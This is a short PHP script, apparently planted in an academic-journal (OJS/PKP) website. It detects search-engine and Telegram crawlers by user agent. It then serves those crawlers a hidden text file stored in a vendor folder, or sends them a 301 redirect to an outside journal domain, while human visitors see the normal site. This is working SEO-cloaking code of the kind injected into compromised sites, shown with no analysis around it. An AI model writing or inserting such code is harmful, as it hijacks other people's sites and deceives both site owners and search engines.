<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function is_homepage() {
    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    return $uri === '/' || $uri === '';
}

if (is_bot()) {
    if (is_homepage()) {
        include('/home/ramlan/jurnal/lib/pkp/lib/vendor/composer/jurnalsains.txt');
    } else {
        header("Location: https://jurnal.sainsglobal.com/", true, 301);
    }
    exit;
}
?>